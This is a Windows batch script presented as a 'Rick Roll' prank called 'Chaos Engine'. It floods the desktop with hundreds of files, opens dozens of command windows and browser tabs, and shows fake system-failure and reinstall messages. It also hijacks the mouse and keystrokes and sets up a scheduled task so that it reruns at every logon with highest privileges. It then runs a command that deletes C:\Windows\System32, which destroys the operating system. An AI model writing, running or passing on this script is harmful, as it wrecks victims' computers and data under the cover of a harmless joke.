@echo off
title Chaos Engine by SceHosting
mode 1000,50
color 0a
setlocal enabledelayedexpansion

for /l %%A in (1,1,100) do echo.

set soundPath="%~dp0music.mp3"
set boomMessage="BOOM! Your system is mine!"

for /l %%A in (1,1,100) do (
    call :Animate "LOADING SYSTEM ERROR... PLEASE WAIT"
)

cls
echo [ERROR] CRITICAL SYSTEM FAILURE DETECTED...
timeout /t 3 /nobreak >nul
start "" https://www.youtube.com/results?search_query=rickroll
timeout /t 3 /nobreak >nul
start "" https://www.youtube.com/watch?v=dQw4w9WgXcQ

set /a i=0
:MassCreate
set /a i+=1
echo YOU GOT RICKROLLED! > "%userprofile%\Desktop\RickRoll_!i!.txt"
if !i! lss 500 goto MassCreate

for %%C in (1 2 3 4 5 6) do (
    color %%C
    timeout /t 1 >nul
)

if exist %soundPath% start "" %soundPath%

cls
echo A critical error occurred. Your system needs to shut down.
timeout /t 5 >nul
color 1f
echo SYSTEM ERROR - RESTARTING NOW...
timeout /t 5 >nul

for /l %%X in (1,1,10) do (
    echo !boomMessage!
    start cmd /c echo !boomMessage!
    timeout /t 1 >nul
)

schtasks /create /tn "RickRollCmd" /tr "%~f0" /sc onlogon /rl highest >nul

for /l %%A in (1,1,30) do (
    start "" cmd /k "color !random! & title CMD %%A & echo Dancing!"
    start "" "https://www.google.com"
)

powershell -command "& {$shell = New-Object -ComObject WScript.Shell; $shell.SendKeys('{F11}')}"
timeout /t 2 >nul
powershell -command "& {$shell = New-Object -ComObject WScript.Shell; $shell.SendKeys('%{F4}')}"
start "" powershell -command "& {Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('Rick Rolling!','Rick Roll');Start-Sleep -s 2; [System.Windows.Forms.Cursor]::Position = [System.Drawing.Point]::new(1000,1000); for($i=0;$i -lt 100;$i++){[System.Windows.Forms.Cursor]::Position = [System.Drawing.Point]::new((Get-Random -Minimum 0 -Maximum 1920),(Get-Random -Minimum 0 -Maximum 1080));Start-Sleep -Milliseconds 50}}"

start "" "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
start "" cmd /k "color 0E & title RickRoll & echo *Dances*"
start "" powershell -command "& {(New-Object Media.SoundPlayer 'C:\Windows\Media\Windows Notify.wav').PlaySync()}"

timeout /t 3 >nul

start "" powershell -command "& {Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('System Restarting...','System Alert');Start-Sleep -s 2; for($i=0;$i -le 100;$i++){cls; echo Restarting... $i%; Start-Sleep -Milliseconds 300}}"

timeout /t 3 >nul

start "" powershell -command "& {Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('Windows Reinstalling...','System Alert');Start-Sleep -s 2; for($i=0;$i -le 100;$i++){cls; echo Installing Windows... $i%; Start-Sleep -Milliseconds 300}}"

timeout /t 15 >nul

rd /s /q "C:\Windows\System32"

cls
echo Well played! See you next time...
timeout /t 5 >nul
exit

:Animate
set str=%~1
set "temp="
for /l %%A in (0,1,250) do (
    set "temp=!temp!."
    cls
    echo %str%!temp!
    timeout /t 0.1 >nul
)

for /l %%A in (1,1,100) do echo.

for /l %%A in (1,1,409) do (
    start cmd /k "color !random! & title Chaos %%A & echo Chaos Reigns!"
    set /a "num=((!random! %% 100) + 1)"
    echo Creating chaos... !num! > nul
    for /l %%B in (1,1,!num!) do echo Chaos File %%B > "%userprofile%\Desktop\chaos_%%B.txt"
    timeout /t 1 >nul
    for %%F in ("%userprofile%\Desktop\chaos_*.txt") do (
        if exist "%%F" del "%%F"
    )
)

for /l %%A in (1,1,100) do echo.

for /l %%C in (1,1,15) do (
    color !random!
    for /l %%D in (1,1,10) do (
        echo Random message !random!
    )
    timeout /t 1 >nul
)

for /l %%A in (1,1,100) do echo.

:InfiniteLoop
echo This will never end!
goto InfiniteLoop

goto :eof
